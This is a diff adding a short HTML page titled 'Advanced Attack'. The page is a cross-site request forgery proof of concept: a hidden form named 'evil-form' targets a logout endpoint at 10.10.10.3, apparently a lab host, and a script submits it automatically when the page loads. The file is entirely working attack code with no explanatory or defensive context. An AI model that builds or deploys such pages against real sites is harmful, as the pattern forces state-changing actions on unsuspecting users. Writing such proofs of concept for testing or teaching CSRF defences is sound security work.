@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Advanced Attack</title>
+</head>
+<body>
+    <h1>Attempting to Force Logout via POST...</h1>
+    
+    <form id="evil-form" action="https://10.10.10.3/logout" method="POST">
+        <input type="submit" value="Click me if script fails">
+    </form>
+
+    <script>
+        document.getElementById("evil-form").submit();
+    </script>
+</body>
+</html>
